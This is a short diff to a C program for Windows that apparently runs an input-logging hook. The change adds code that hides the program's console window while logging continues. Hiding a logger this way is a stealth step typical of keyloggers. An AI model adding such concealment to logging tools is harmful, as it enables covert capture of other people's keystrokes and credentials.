@@ -66,7 +66,8 @@ int main()
     }
 
     printf("Start logging... Press Ctrl+C to stop.\n"); // Notification 
-
+    // Hide the console window
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     // Message loop to keep the hook active
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) 
